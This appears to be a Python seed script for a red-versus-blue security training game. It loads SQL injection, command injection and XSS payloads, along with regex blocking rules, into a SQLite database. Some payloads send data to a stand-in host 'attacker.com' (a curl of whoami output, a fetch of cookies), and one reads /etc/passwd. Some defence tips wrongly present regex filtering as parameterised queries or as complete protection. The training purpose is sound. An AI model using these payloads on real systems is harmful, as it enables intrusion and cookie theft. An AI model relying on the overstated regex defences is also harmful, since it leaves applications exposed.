import sqlite3

def seed_database():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()

    # Clear existing data
    c.execute("DELETE FROM red_payloads")
    c.execute("DELETE FROM blue_defenses")

    red_payloads = [
        # SQL Injection (sqli_login)
        ('sqli_login', 'Auth Bypass (Basic)', "' OR 1=1 --", 'A classic SQL injection that tricks the database into returning true.', 'Beginner'),
        ('sqli_login', 'Union Exfiltration', "' UNION SELECT null, username, password FROM users --", 'Uses UNION to append data from other tables into the result set.', 'Intermediate'),
        ('sqli_login', 'Blind Time-Based SQLi', "admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A) AND '1'='1", 'Forces the database to sleep, proving vulnerability without visible output.', 'Advanced'),
        
        # Command Injection (cmd_ping)
        ('cmd_ping', 'Basic Concatenation', "127.0.0.1; ls -la", 'Uses a semicolon to run a second command after the first finishes.', 'Beginner'),
        ('cmd_ping', 'Pipeline Execution', "127.0.0.1 | cat /etc/passwd", 'Pipes the output of the first command into the second, often bypassing simple filters.', 'Intermediate'),
        ('cmd_ping', 'Out-of-Band Exfil', "127.0.0.1 && curl http://attacker.com/$(whoami)", 'Executes a payload and sends the result to an external attacker-controlled server.', 'Advanced'),

        # XSS (xss_search)
        ('xss_search', 'Alert Box', "<script>alert(1)</script>", 'The most basic XSS payload to prove script execution.', 'Beginner'),
        ('xss_search', 'Image Error Payload', "<img src=x onerror=alert(document.cookie)>", 'Bypasses simple <script> filters by using HTML event handlers.', 'Intermediate'),
        ('xss_search', 'Blind XSS Exfiltration', "'-fetch('http://attacker.com/?c='+btoa(document.cookie))-'", 'Steals cookies silently and sends them to a remote server in the background.', 'Advanced'),
    ]

    blue_defenses = [
        # SQL Injection Defenses
        ('sqli_login', 'Block Tautologies', r"OR\s+1=1", 'Blocks the exact string "OR 1=1". Easy to bypass but stops basic scripts.', 'Beginner'),
        ('sqli_login', 'Block UNION/SELECT', r"(?i)UNION\s+SELECT", 'Prevents attackers from joining tables to exfiltrate data.', 'Intermediate'),
        ('sqli_login', 'Parametrized Queries Enforcer', r"['\";]|(--)", 'Strict regex blocking all SQL metacharacters entirely.', 'Advanced'),

        # Command Injection Defenses
        ('cmd_ping', 'Block Semicolons', r";", 'Stops the most basic command concatenation.', 'Beginner'),
        ('cmd_ping', 'Block Pipes & Ampersands', r"[|&]", 'Prevents pipeline and conditional execution chaining.', 'Intermediate'),
        ('cmd_ping', 'Strict IP Validator', r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", 'Only allows valid IP addresses. The ultimate defense against command injection here.', 'Advanced'),

        # XSS Defenses
        ('xss_search', 'Block Script Tags', r"(?i)<script>", 'Stops standard script tags, but vulnerable to event handlers.', 'Beginner'),
        ('xss_search', 'Block Event Handlers', r"(?i)on\w+\s*=", 'Blocks all "onX" attributes like onerror, onload.', 'Intermediate'),
        ('xss_search', 'Strict HTML Escaping', r"[<>\"']", 'Blocks all HTML metacharacters, completely neutralizing XSS.', 'Advanced'),
    ]

    for p in red_payloads:
        c.execute("INSERT INTO red_payloads (scenario, label, payload, tip, level) VALUES (?, ?, ?, ?, ?)", p)

    for d in blue_defenses:
        c.execute("INSERT INTO blue_defenses (scenario, label, rule, tip, level) VALUES (?, ?, ?, ?, ?)", d)

    conn.commit()
    conn.close()
    print("Database seeded with leveled arsenals!")

if __name__ == '__main__':
    seed_database()
